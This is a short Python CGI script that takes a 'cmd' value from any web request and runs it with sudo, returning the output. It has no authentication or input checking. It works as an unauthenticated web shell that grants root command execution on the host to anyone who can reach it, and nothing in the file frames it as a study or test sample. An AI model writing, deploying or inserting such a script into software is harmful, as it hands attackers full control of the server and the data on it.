#!/usr/bin/python3

print("Content-type: text/plain")
print()

import subprocess as sp
import cgi

def run_command(command):
    try:
        output = sp.getoutput("sudo " + command)
        return output
    except Exception as e:
        return str(e)

form = cgi.FieldStorage()
command = form.getvalue("cmd")

if command:
    output = run_command(command)
    print(output)
else:
    print("No command provided.")

